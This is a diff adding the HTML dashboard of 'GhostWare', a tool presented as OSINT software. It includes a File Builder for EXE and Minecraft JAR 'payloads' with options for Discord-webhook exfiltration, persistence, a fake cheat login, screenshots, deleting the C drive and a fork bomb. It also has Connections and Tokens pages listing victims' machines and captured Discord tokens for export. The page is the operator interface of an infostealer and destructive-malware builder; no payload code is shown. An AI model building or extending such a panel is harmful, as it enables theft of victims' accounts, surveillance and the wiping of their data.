@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>GhostWare — Dashboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="./css/style.css" />
+<link rel="stylesheet" href="./css/titlebar.css" />
+<link rel="icon" href="./assets/reaper.svg" />
+</head>
+<body>
+<script src="./js/titlebar.js"></script>
+<div id="grid"></div>
+<div id="aura"></div>
+<div id="glow"></div>
+
+<!-- Startup sound -->
+<audio id="startup-sound" preload="auto">
+  <source src="./assets/fallasleep.mp3" type="audio/mpeg">
+</audio>
+
+<div class="app">
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="brand">
+      <div class="reaper" data-reaper></div>
+      <span class="brand-name shimmer">GHOST<span class="accent">WARE</span></span>
+    </div>
+
+    <div class="nav-item active" data-page="dashboard"><span class="ic">▦</span> Dashboard</div>
+    <div class="nav-item" data-page="features"><span class="ic">✦</span> Features</div>
+
+    <div class="nav-label">Osint Modules</div>
+    <div class="nav-item" data-page="discord"><span class="ic">◉</span> Discord Lookup</div>
+    <div class="nav-item" data-page="phone"><span class="ic">✆</span> Phone OSINT</div>
+    <div class="nav-item" data-page="email"><span class="ic">✉</span> Email Lookup</div>
+    <div class="nav-item" data-page="domain"><span class="ic">⌂</span> Domain Lookup</div>
+    <div class="nav-item" data-page="ip"><span class="ic">◐</span> IP Lookup</div>
+    <div class="nav-item" data-page="username"><span class="ic">☺</span> Username Lookup</div>
+    <div class="nav-item" data-page="crypto"><span class="ic">◆</span> Crypto Wallet</div>
+    <div class="nav-item" data-page="roblox"><span class="ic">▲</span> Roblox Lookup</div>
+    <div class="nav-item" data-page="github"><span class="ic">❯</span> GitHub Lookup</div>
+    <div class="nav-item" data-page="tiktok"><span class="ic">♪</span> TikTok Lookup</div>
+
+    <div class="nav-label">Tools</div>
+    <div class="nav-item" data-page="builder"><span class="ic">⛭</span> Report Builder</div>
+    <div class="nav-item" data-page="filebuilder"><span class="ic">▤</span> File Builder</div>
+    <div class="nav-item" data-page="virustotal"><span class="ic">⊘</span> VirusTotal</div>
+
+    <div class="nav-item" data-page="connections"><span class="ic">⧉</span> Connections</div>
+
+    <div class="nav-label">Community</div>
+    <div class="nav-item" data-page="chat"><span class="ic">◉</span> Live Chat</div>
+    <div class="nav-item" data-page="support"><span class="ic">✎</span> Support</div>
+
+    <div class="nav-label">Account</div>
+    <div class="nav-item" data-page="profile"><span class="ic">☺</span> Profile</div>
+    <div class="nav-item" data-page="settings"><span class="ic">⚙</span> Settings</div>
+    <div class="nav-item" data-page="commands"><span class="ic">▸</span> Commands</div>
+    <div class="sidebar-foot">
+      <div class="side-profile" id="sideProfile" title="Open profile">
+        <div class="side-pfp" id="sidePfp">O</div>
+        <div class="side-meta"><div class="side-name" id="sideName">operator</div><span class="owner-badge" id="sideOwnerBadge" style="display:none">OWNER</span><span class="dev-badge" id="sideDevBadge" style="display:none">DEV</span></div>
+      </div>
+      <div class="nav-item danger" id="signout"><span class="ic">⇥</span> Sign Out</div>
+      <div class="nav-item" id="downloadApp"><span class="ic">⭳</span> Download App</div>
+    </div>
+  </aside>
+
+  <!-- Main -->
+  <main class="main">
+
+    <!-- ============ DASHBOARD ============ -->
+    <section class="page active" data-view="dashboard">
+      <div class="topbar">
+        <div>
+          <div class="welcome">Welcome back <b id="uname">operator</b></div>
+          <div class="subtle">Overview of your OSINT operations</div>
+        </div>
+        <button class="sound-toggle" id="soundToggle" title="Toggle sound"></button>
+      </div>
+
+      <div class="grid-cards">
+        <div class="card" style="animation-delay:.02s"><div class="card-label">Lookups <span>◈</span></div><div class="card-val" id="c-lookups">0</div><div class="card-note">Total run</div></div>
+        <div class="card" style="animation-delay:.08s"><div class="card-label">Sound <span>◉</span></div><div class="card-val" style="font-size:22px;" id="c-sound">On</div><div class="card-note">Interface audio</div></div>
+        <div class="card" style="animation-delay:.14s"><div class="card-label">Today <span>≈</span></div><div class="card-val" id="c-today">0</div><div class="card-note">Lookups today</div></div>
+        <div class="card" style="animation-delay:.20s"><div class="card-label">Live Chat <span>◉</span></div><div class="card-val" style="font-size:22px;" id="c-online">—</div><div class="card-note" data-goto="chat" style="cursor:pointer;text-decoration:underline;">Open lobby →</div></div>
+      </div>
+
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-head"><h3>Recent Searches</h3><a data-goto="username">New search →</a></div>
+          <div class="search-row">
+            <input type="text" id="q" placeholder="Search a username, email, IP, domain…" />
+            <button class="btn" style="width:auto;padding:11px 18px;" id="runSearch">Run</button>
+          </div>
+          <div id="results"><div class="empty">No searches yet — run one above to populate your feed.</div></div>
+        </div>
+
+        <div class="panel">
+          <div class="panel-head"><h3>Weekly Activity</h3><span style="font-size:11px;color:var(--txt-faint)">Last 7 days</span></div>
+          <div class="bars" id="bars"></div>
+          <div style="margin-top:22px;border-top:1px solid var(--line);padding-top:18px;">
+            <div class="panel-head"><h3>Total Lookups</h3></div>
+            <div class="big-num" id="creditNum">0</div>
+            <div class="card-note" style="margin:6px 0 14px;">Across all your sessions</div>
+            <button class="btn" data-goto="username">Start a search →</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel builder-dashboard-panel">
+        <div class="panel-head">
+          <h3>Builder Logs</h3>
+          <span class="badge" id="builderLogCount">0 entries</span>
+        </div>
+        <div class="builder-log" id="dash-builder-log">
+          <div class="builder-log-empty">No builder runs yet — start one from the Report Builder tab.</div>
+        </div>
+      </div>
+      <div class="foot">© 2026 GhostWare — For authorized security research only.</div>
+    </section>
+
+    <!-- ============ LOOKUP MODULE PAGES (generated) ============ -->
+    <section class="page" data-view="ip"></section>
+    <section class="page" data-view="domain"></section>
+    <section class="page" data-view="phone"></section>
+    <section class="page" data-view="discord"></section>
+    <section class="page" data-view="email"></section>
+    <section class="page" data-view="username"></section>
+    <section class="page" data-view="crypto"></section>
+    <section class="page" data-view="roblox"></section>
+    <section class="page" data-view="github"></section>
+    <section class="page" data-view="tiktok"></section>
+
+    <!-- ============ REPORT BUILDER ============ -->
+    <section class="page" data-view="builder">
+      <div class="page-title">Report Builder <span class="badge">Tools</span></div>
+      <div class="page-desc">Enter a name or target and GhostWare will build a report, stream the progress, and save the log to your dashboard.</div>
+      <div class="builder-shell">
+        <div class="builder-hero">
+          <div>
+            <div class="builder-kicker">Builder console</div>
+            <h3>Build a GhostWare report</h3>
+            <p>Select the modules you want to run, then start the build. Every step gets recorded so you can review it from the dashboard later.</p>
+          </div>
+          <div class="builder-status-pill" id="bld-state">Waiting for input</div>
+        </div>
+        <div class="builder-grid">
+          <div class="builder-panel">
+            <div class="lookup-form" style="margin-bottom:14px;">
+              <input type="text" id="bld-target" placeholder="Target — username, IP, domain, wallet, Discord ID…" autocomplete="off" />
+              <button class="btn" id="bld-run" style="width:auto;padding:13px 26px;">Build report →</button>
+            </div>
+            <div class="build-mods" id="bld-mods"></div>
+            <div class="build-actions">
+              <button class="btn ghost" id="bld-copy" style="width:auto;">Copy JSON</button>
+              <button class="btn ghost" id="bld-download" style="width:auto;">Download .json</button>
+              <button class="btn ghost" id="bld-clear" style="width:auto;">Clear</button>
+            </div>
+            <div class="msg" id="bld-msg"></div>
+          </div>
+          <div class="builder-panel">
+            <div class="panel-head" style="margin-bottom:12px;">
+              <h3 style="font-size:15px;">Build log</h3>
+              <span class="badge" id="bld-log-count">0 entries</span>
+            </div>
+            <div class="builder-log" id="bld-log">
+              <div class="builder-log-empty">No build started yet.</div>
+            </div>
+          </div>
+        </div>
+        <div id="bld-out"></div>
+      </div>
+    </section>
+
+    <!-- ============ FILE BUILDER ============ -->
+    <section class="page" data-view="filebuilder">
+      <div class="page-title">File Builder <span class="badge">Tools</span></div>
+      <div class="page-desc">Build EXE payloads or Minecraft JAR agents. Use the AI assistant to configure them by describing what you want.</div>
+
+      <!-- Tab switcher -->
+      <div class="builder-tabs">
+        <button class="builder-tab active" data-pane="fb-exe-pane">EXE Builder</button>
+        <button class="builder-tab" data-pane="fb-jar-pane">JAR Builder</button>
+      </div>
+
+      <!-- ── EXE PANE ── -->
+      <div class="builder-pane active" id="fb-exe-pane">
+        <div class="panel">
+          <div class="fb-grid">
+            <div class="fb-left">
+              <div class="field">
+                <label>PAYLOAD NAME</label>
+                <input type="text" id="fb-name" value="ghostware-payload" autocomplete="off" spellcheck="false" />
+              </div>
+              <div class="field" style="margin-top:18px;">
+                <label>EXECUTABLE SIZE</label>
+                <input type="range" id="fb-size-slider" class="size-slider" min="1024" max="102400" step="512" value="28544" />
+                <div class="fb-size-display"><span id="fb-size-label">28544 KB</span></div>
+              </div>
+              <div style="margin-top:24px;">
+                <button class="btn fb-dl-btn" id="fb-download">Download .exe</button>
+                <div class="fb-dl-note" id="fb-dl-note"></div>
+              </div>
+            </div>
+            <div class="fb-right">
+              <div class="field">
+                <label>WEBHOOK URL (optional)</label>
+                <input type="text" id="fb-webhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" style="font-size:12px;" />
+                <div id="fb-webhook-status" style="margin-top:6px;min-height:20px;"></div>
+                <div class="upload-hint">Send connection data to Discord webhook. Leave empty to use direct connection only.</div>
+              </div>
+              <div class="field" style="margin-top:10px;">
+                <label>CUSTOM MESSAGE</label>
+                <input type="text" id="fb-message" placeholder="Optional message embedded in payload" autocomplete="off" />
+              </div>
+              <div class="field" style="margin-top:10px;">
+                <label>CUSTOM ICON (optional)</label>
+                <input type="file" id="fb-icon" accept=".ico,.png,.jpg,.jpeg" style="display:none;" />
+                <button class="btn ghost" id="fb-icon-btn" style="width:auto;padding:11px 18px;">Choose File</button>
+                <span id="fb-icon-name" style="margin-left:12px;color:var(--txt-faint);font-size:13px;">No file chosen</span>
+                <div class="upload-hint">Upload .ico, .png, or .jpg file to use as EXE icon. Leave empty for default.</div>
+              </div>
+              <div class="fb-startup-row" style="margin-top:16px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-startup" checked />
+                  Launch on startup (persistent)
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-fakelogin" checked />
+                  Show fake cheat login screen
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-screenshot" checked />
+                  Capture screenshot on run
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-update-overtime" />
+                  Update over time (runs every 10 minutes)
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-cant-delete" />
+                  Can't delete (recreates if deleted)
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-run-background" />
+                  Run in background (hidden window)
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-task-protection" />
+                  Task manager protection (multiplies when killed)
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-disable-reset" />
+                  Disable reset (blocks PC resets)
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-restart-on-open" />
+                  Restart Loop (restarts pc on a loop)
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-disable-mouse" />
+                  Disable Mouse
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-del-c-drive" />
+                  Del C Drive
+                </label>
+              </div>
+              <div class="fb-startup-row" style="margin-top:10px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="fb-fork-bomb" />
+                  Fork Bomb (infinite processes)
+                </label>
+              </div>
+            </div>
+          </div>
+          <div class="msg" id="fb-msg" style="margin-top:16px;"></div>
+        </div>
+      </div>
+
+      <!-- ── JAR PANE ── -->
+      <div class="builder-pane" id="fb-jar-pane">
+        <div class="panel">
+          <div class="fb-grid">
+            <div class="fb-left">
+              <div class="field">
+                <label>AGENT NAME</label>
+                <input type="text" id="jb-name" value="ghostware-agent" autocomplete="off" spellcheck="false" />
+              </div>
+              <div class="field" style="margin-top:18px;">
+                <label>MINECRAFT VERSION</label>
+                <select id="jb-mc-version" style="width:100%;padding:10px;background:#1a1a24;border:1px solid #2a2a36;color:#fff;border-radius:6px;cursor:pointer;">
+                  <option value="1.21.1">1.21.1</option>
+                  <option value="1.21.2">1.21.2</option>
+                  <option value="1.21.3">1.21.3</option>
+                  <option value="1.21.4">1.21.4</option>
+                  <option value="1.21.5">1.21.5</option>
+                  <option value="1.21.6">1.21.6</option>
+                  <option value="1.21.7">1.21.7</option>
+                  <option value="1.21.8">1.21.8</option>
+                  <option value="1.21.9">1.21.9</option>
+                  <option value="1.21.10">1.21.10</option>
+                  <option value="1.21.11" selected>1.21.11</option>
+                </select>
+              </div>
+              <div class="field" style="margin-top:18px;">
+                <label>JAR SIZE</label>
+                <input type="range" id="jb-size-slider" class="size-slider" min="512" max="51200" step="256" value="4096" />
+                <div class="fb-size-display"><span id="jb-size-label">4096 KB</span></div>
+              </div>
+              <div style="margin-top:24px;">
+                <button class="btn fb-dl-btn" id="jb-download">Download .jar</button>
+                <div class="fb-dl-note" id="jb-dl-note"></div>
+              </div>
+            </div>
+            <div class="fb-right">
+              <div class="field">
+                <label>WEBHOOK URL (optional)</label>
+                <input type="text" id="jb-webhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" style="font-size:12px;" />
+                <div id="jb-webhook-status" style="margin-top:6px;min-height:20px;"></div>
+                <div class="upload-hint">Send connection data to Discord webhook. Leave empty to use direct connection only.</div>
+              </div>
+              <div class="field" style="margin-top:10px;">
+                <label>AGENT DESCRIPTION</label>
+                <input type="text" id="jb-desc" placeholder="Optional description" autocomplete="off" />
+              </div>
+              <div class="fb-startup-row" style="margin-top:16px;">
+                <label class="fb-checkbox-label">
+                  <input type="checkbox" id="jb-screenshot" checked />
+                  Capture screenshot on run
+                </label>
+              </div>
+            </div>
+          </div>
+          <div class="msg" id="jb-msg" style="margin-top:16px;"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ CONNECTIONS ============ -->
+    <section class="page" data-view="connections">
+      <div class="page-title">Connections <span class="badge">Live</span></div>
+
+      <!-- Stats cards -->
+      <div class="grid-cards" style="margin-bottom:22px;">
+        <div class="card">
+          <div class="card-label">Total Clients</div>
+          <div class="card-val" id="conn-stat-total">0</div>
+          <div class="card-note">All time</div>
+        </div>
+        <div class="card">
+          <div class="card-label">Active Clients</div>
+          <div class="card-val" id="conn-stat-active">0</div>
+          <div class="card-note">Online now</div>
+        </div>
+        <div class="card">
+          <div class="card-label">EXE Agents</div>
+          <div class="card-val" id="conn-stat-exe">0</div>
+          <div class="card-note">Windows payloads</div>
+        </div>
+        <div class="card">
+          <div class="card-label">Tokens</div>
+          <div class="card-val" id="conn-stat-tokens">0</div>
+          <div class="card-note">Captured</div>
+        </div>
+      </div>
+
+      <!-- Sub-tabs -->
+      <div class="builder-tabs" style="margin-bottom:16px;">
+        <button class="builder-tab active" data-ctab="tab-connections">Connections</button>
+        <button class="builder-tab" data-ctab="tab-tokens">Tokens</button>
+      </div>
+
+      <!-- ── Connections pane ── -->
+      <div class="ctab-pane active" id="tab-connections">
+        <div class="panel" style="padding:0;overflow:hidden;">
+          <div class="ctn-toolbar">
+            <span class="ctn-toolbar-title">⧉ Connections</span>
+            <div class="ctn-toolbar-right">
+              <select class="ctn-per-page" id="conn-per-page">
+                <option value="5">5</option>
+                <option value="10" selected>10</option>
+                <option value="25">25</option>
+                <option value="50">50</option>
+              </select>
+              <input type="text" class="ctn-search" id="conn-search" placeholder="Search Logs" style="min-width:260px;" />
+            </div>
+          </div>
+          <div class="ctn-table-wrap">
+            <table class="ctn-table">
+              <thead>
+                <tr>
+                  <th>Pc Name <span class="ctn-sort">⇅</span></th>
+                  <th>IP <span class="ctn-sort">⇅</span></th>
+                  <th>Country <span class="ctn-sort">⇅</span></th>
+                  <th>Hardware <span class="ctn-sort">⇅</span></th>
+                  <th>Windows <span class="ctn-sort">⇅</span></th>
+                  <th>Discord Name <span class="ctn-sort">⇅</span></th>
+                  <th>Nitro <span class="ctn-sort">⇅</span></th>
+                  <th>Acct Created <span class="ctn-sort">⇅</span></th>
+                  <th>Status <span class="ctn-sort">⇅</span></th>
+                  <th>Screenshot <span class="ctn-sort">⇅</span></th>
+                  <th>Options</th>
+                </tr>
+              </thead>
+              <tbody id="connections-list">
+                <tr class="ctn-empty-row">
+                  <td colspan="11">No connections yet — build and run an EXE or JAR to see them here.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="ctn-pagination" id="conn-pagination"></div>
+        </div>
+      </div>
+
+      <!-- ── Tokens pane ── -->
+      <div class="ctab-pane" id="tab-tokens">
+        <div class="panel" style="padding:0;overflow:hidden;">
+          <div class="ctn-toolbar">
+            <span class="ctn-toolbar-title">◈ Tokens</span>
+            <div class="ctn-toolbar-right">
+              <select class="ctn-per-page" id="tok-per-page">
+                <option value="5">5</option>
+                <option value="10" selected>10</option>
+                <option value="25">25</option>
+                <option value="50">50</option>
+              </select>
+              <input type="text" class="ctn-search" id="tok-search" placeholder="Search Tokens" />
+              <button class="btn ghost ctn-action-btn" id="export-tokens">Export .txt</button>
+            </div>
+          </div>
+          <div class="ctn-table-wrap">
+            <table class="ctn-table">
+              <thead>
+                <tr>
+                  <th>Discord Name <span class="ctn-sort">⇅</span></th>
+                  <th>Has Nitro <span class="ctn-sort">⇅</span></th>
+                  <th>Date Of Account <span class="ctn-sort">⇅</span></th>
+                  <th>Discord Token</th>
+                </tr>
+              </thead>
+              <tbody id="tokens-list">
+                <tr class="ctn-empty-row">
+                  <td colspan="4">No tokens yet — tokens are captured when a built EXE runs on a target machine.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="ctn-pagination" id="tok-pagination"></div>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- ============ VIRUSTOTAL ============ -->
+    <section class="page" data-view="virustotal">
+      <div class="page-title">VirusTotal <span class="badge">Scan</span></div>
+      <div class="page-desc">Drag a file in to scan it against 70+ antivirus engines via the VirusTotal API.</div>
+      <div class="panel">
+        <div class="vt-drop" id="vtDrop">
+          <div class="vt-drop-icon">⊘</div>
+          <div class="vt-drop-main">Drag &amp; drop a file here</div>
+          <div class="vt-drop-sub">or <span class="vt-browse" id="vtBrowse">browse</span> · max 32 MB (free tier)</div>
+          <input type="file" id="vtFile" hidden />
+        </div>
+        <div class="msg" id="vt-msg"></div>
+        <div id="vtResult"></div>
+        <div class="info-note" id="vtKeyNote">
+          Needs a free VirusTotal API key. Add yours in <a data-goto="settings" style="color:var(--txt);text-decoration:underline;cursor:pointer;">Settings</a>.
+          Note: on a static site the key lives in your browser — only use a personal key, and the free tier allows ~4 scans/min.
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ LIVE CHAT ============ -->
+    <section class="page" data-view="chat">
+      <div class="page-title">Live Chat <span class="badge">Real-time</span></div>
+      <div class="page-desc">Public lobby — every signed-in GhostWare account shares this room. Messages sync live and are saved so you'll see them when you come back.</div>
+      <div class="chat-wrap">
+        <div class="chat-status" id="chatStatus">
+          <span class="dot-live"></span><span id="chatStatusText">Connecting…</span>
+          <span class="who">you: <b id="chatWho">—</b></span>
+        </div>
+        <div class="chat-log" id="chatLog"></div>
+        <div class="chat-typing" id="chatTyping"></div>
+        <form class="chat-input" id="chatForm">
+          <input type="text" id="chatInput" placeholder="Message the lobby…" autocomplete="off" maxlength="500" />
+          <button type="submit" class="btn">Send</button>
+        </form>
+      </div>
+      <div class="info-note">Public demo lobby on a shared broker — anyone running GhostWare can read it. Don't post anything private.</div>
+    </section>
+
+    <!-- ============ SUPPORT CHAT ============ -->
+    <section class="page" data-view="support">
+      <div class="page-title">Support <span class="badge">Live help</span></div>
+      <div class="page-desc">Chat with the GhostWare team and other operators. Separate from the public lobby; history is saved on this device.</div>
+      <div class="chat-wrap">
+        <div class="chat-status" id="supStatus">
+          <span class="dot-live"></span><span id="supStatusText">Connecting…</span>
+          <span class="who">you: <b id="supWho">—</b></span>
+        </div>
+        <div class="chat-log" id="supLog"></div>
+        <div class="chat-typing" id="supTyping"></div>
+        <form class="chat-input" id="supForm">
+          <input type="text" id="supInput" placeholder="Describe your issue…" autocomplete="off" maxlength="500" />
+          <button type="submit" class="btn">Send</button>
+        </form>
+      </div>
+      <div class="info-note">Demo support room on a public broker. For a real product, route this to a staffed backend/helpdesk.</div>
+    </section>
+
+    <!-- ============ PROFILE ============ -->
+    <section class="page" data-view="profile">
+      <div class="page-title">Profile <span class="badge">Account</span></div>
+      <div class="page-desc">Your GhostWare identity and account settings.</div>
+
+      <div class="profile-hero" id="profileHero">
+        <div class="profile-banner" id="pfBanner"></div>
+        <div class="profile-hero-row">
+          <div class="pfp" id="pfpInitial">O</div>
+          <div>
+            <h2 id="pf-name">operator</h2><span class="owner-badge" id="pfOwnerBadge" style="display:none">OWNER</span><span class="dev-badge" id="pfDevBadge" style="display:none">DEV</span>
+            <div class="handle" id="pf-email">you@ghostware.io</div>
+          </div>
+          <div style="margin-left:auto;text-align:right;">
+            <div class="card-val" style="font-size:24px;" id="pf-tier">FREE</div>
+            <div class="card-note">Member since <span id="pf-since">—</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head"><h3>Appearance</h3></div>
+        <div class="profile-edit">
+          <div class="field">
+            <label>Profile picture</label>
+            <div class="upload-row">
+              <button type="button" class="btn ghost" id="pfpPick" style="width:auto;">Upload image</button>
+              <button type="button" class="btn ghost" id="pfpClear" style="width:auto;">Remove</button>
+              <input type="file" id="pfpFile" accept="image/*" hidden />
+            </div>
+            <div class="upload-hint">Square works best. Stored on this device.</div>
+          </div>
+          <div class="field">
+            <label>Banner</label>
+            <div class="upload-row">
+              <button type="button" class="btn ghost" id="bannerPick" style="width:auto;">Upload banner</button>
+              <button type="button" class="btn ghost" id="bannerClear" style="width:auto;">Remove</button>
+              <input type="file" id="bannerFile" accept="image/*" hidden />
+            </div>
+            <div class="upload-hint">Wide image (~3:1). Stored on this device.</div>
+          </div>
+        </div>
+        <div class="msg" id="pf-appearance-msg"></div>
+      </div>
+
+      <div class="panel" style="margin-top:18px;">
+        <div class="panel-head"><h3>Edit Profile</h3></div>
+        <div class="profile-edit">
+          <div class="field"><label>Username</label><input type="text" id="pf-user-input" /></div>
+          <div class="field"><label>Email</label><input type="email" id="pf-email-input" /></div>
+          <div class="field"><label>New Password (optional)</label><input type="password" id="pf-pass-input" placeholder="leave blank to keep" /></div>
+          <div class="field"><label>Confirm Password</label><input type="password" id="pf-pass2-input" placeholder="repeat new password" /></div>
+        </div>
+        <button class="btn" id="pf-save" style="width:auto;padding:12px 28px;margin-top:6px;">Save changes</button>
+        <div class="msg" id="pf-msg"></div>
+        <div class="info-note">Your account data is stored locally in this browser. Connect a backend to sync across devices.</div>
+      </div>
+
+      <div class="grid-cards" style="margin-top:18px;">
+        <div class="card"><div class="card-label">Total Lookups</div><div class="card-val" id="pf-total">0</div></div>
+        <div class="card"><div class="card-label">Access</div><div class="card-val" id="pf-access">FREE</div></div>
+        <div class="card"><div class="card-label">Today</div><div class="card-val" id="pf-today">0</div></div>
+        <div class="card"><div class="card-label">Status</div><div class="card-val" style="color:#7dffa0;font-size:22px;">ACTIVE</div></div>
+      </div>
+    </section>
+
+    <!-- ============ SETTINGS ============ -->
+    <section class="page" data-view="settings">
+      <div class="page-title">Settings <span class="badge">Account</span></div>
+      <div class="page-desc">Preferences for this device. Everything here is stored locally in your browser.</div>
+
+      <div class="panel">
+        <div class="panel-head"><h3>Appearance</h3></div>
+        <div class="setting-row">
+          <div><div class="setting-title">Theme Mode</div><div class="setting-sub">Switch between dark and light interface.</div></div>
+          <select id="set-theme-mode" class="theme-select">
+            <option value="dark">Dark</option>
+            <option value="light">Light</option>
+          </select>
+        </div>
+        <div class="setting-row">
+          <div><div class="setting-title">Color Scheme</div><div class="setting-sub">Choose your preferred color palette.</div></div>
+          <select id="set-color-scheme" class="theme-select">
+            <option value="purple">Purple (Default)</option>
+            <option value="blue">Blue Ocean</option>
+            <option value="green">Matrix Green</option>
+            <option value="red">Red Alert</option>
+            <option value="cyberpunk">Cyberpunk</option>
+            <option value="monochrome">Monochrome</option>
+          </select>
+        </div>
+        <div class="setting-row">
+          <div><div class="setting-title">Accent Color</div><div class="setting-sub">Customize buttons and highlights.</div></div>
+          <div class="color-picker-row">
+            <button class="color-swatch" data-color="#a78bfa" style="background:#a78bfa;" title="Purple"></button>
+            <button class="color-swatch" data-color="#60a5fa" style="background:#60a5fa;" title="Blue"></button>
+            <button class="color-swatch" data-color="#34d399" style="background:#34d399;" title="Green"></button>
+            <button class="color-swatch" data-color="#f87171" style="background:#f87171;" title="Red"></button>
+            <button class="color-swatch" data-color="#fbbf24" style="background:#fbbf24;" title="Yellow"></button>
+            <button class="color-swatch" data-color="#fb923c" style="background:#fb923c;" title="Orange"></button>
+            <button class="color-swatch" data-color="#ec4899" style="background:#ec4899;" title="Pink"></button>
+            <button class="color-swatch" data-color="#8b5cf6" style="background:#8b5cf6;" title="Violet"></button>
+          </div>
+        </div>
+        <div class="setting-row">
+          <div><div class="setting-title">Reset Accent Color</div><div class="setting-sub">Restore default accent color.</div></div>
+          <button class="btn ghost" id="reset-accent-btn" style="width:auto;">Reset to Default</button>
+        </div>
+      </div>
+
+      <div class="panel" style="margin-top:18px;">
+        <div class="panel-head"><h3>Preferences</h3></div>
+        <div class="setting-row">
+          <div><div class="setting-title">Interface sounds</div><div class="setting-sub">Clicks, hovers and result blips.</div></div>
+          <button class="toggle" id="set-sound" role="switch"><span class="knob"></span></button>
+        </div>
+        <div class="setting-row">
+          <div><div class="setting-title">Mouse glow &amp; sparks</div><div class="setting-sub">The white/gray light that follows your cursor.</div></div>
+          <button class="toggle" id="set-effects" role="switch"><span class="knob"></span></button>
+        </div>
+        <div class="setting-row">
+          <div><div class="setting-title">Save chat history</div><div class="setting-sub">Keep old messages on this device so you see them when you return.</div></div>
+          <button class="toggle" id="set-chatsave" role="switch"><span class="knob"></span></button>
+        </div>
+      </div>
+
+      <div class="panel" style="margin-top:18px;">
+        <div class="panel-head"><h3>Data</h3></div>
+        <div class="setting-row">
+          <div><div class="setting-title">Clear chat history</div><div class="setting-sub">Wipe saved lobby &amp; support messages on this device.</div></div>
+          <button class="btn ghost" id="set-clearchat" style="width:auto;">Clear chats</button>
+        </div>
+        <div class="setting-row">
+          <div><div class="setting-title">Reset local data</div><div class="setting-sub">Remove stats, recent searches and appearance for this account.</div></div>
+          <button class="btn ghost" id="set-resetdata" style="width:auto;">Reset</button>
+        </div>
+        <div class="msg" id="set-msg"></div>
+      </div>
+
+      <div class="panel" style="margin-top:18px;">
+        <div class="panel-head"><h3>Integrations</h3></div>
+        <div class="field">
+          <label>VirusTotal API key</label>
+          <input type="password" id="set-vtkey" placeholder="paste your VirusTotal API key" autocomplete="off" />
+          <div class="upload-hint">Used by the VirusTotal tab. Stored only in this browser. Free key: virustotal.com → profile → API key.</div>
+        </div>
+        <div class="field" style="margin-top:14px;">
+          <label>Discord Bot Token</label>
+          <input type="password" id="set-discord-bot-token" placeholder="paste your Discord Bot token" autocomplete="off" />
+          <div class="upload-hint">Used by Discord Lookup to fetch real usernames, avatars, and display names. Create a free bot at discord.com/developers — no server needed. Stored only on this device.</div>
+        </div>
+        <div class="profile-edit" style="margin-top:6px;">
+          <div class="field"><label>EmailJS Service ID</label><input type="text" id="set-ejs-service" placeholder="service_xxx" autocomplete="off" /></div>
+          <div class="field"><label>EmailJS Template ID</label><input type="text" id="set-ejs-template" placeholder="template_xxx" autocomplete="off" /></div>
+          <div class="field"><label>EmailJS Public Key</label><input type="text" id="set-ejs-key" placeholder="public key" autocomplete="off" /></div>
+        </div>
+        <div class="upload-hint">Optional — lets the login screen send a real "verify your email" code. Without these, verification runs in demo mode (code shown on screen). Template must accept variables: <b>to_email</b>, <b>code</b>.</div>
+        <button class="btn" id="set-int-save" style="width:auto;padding:11px 24px;margin-top:12px;">Save integrations</button>
+        <div class="msg" id="set-int-msg"></div>
+      </div>
+
+      <div class="panel discord-panel" style="margin-top:18px;">
+        <div class="discord-box">
+          <div class="discord-logo">
+            <svg width="71" height="55" viewBox="0 0 71 55" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <g clip-path="url(#clip0)">
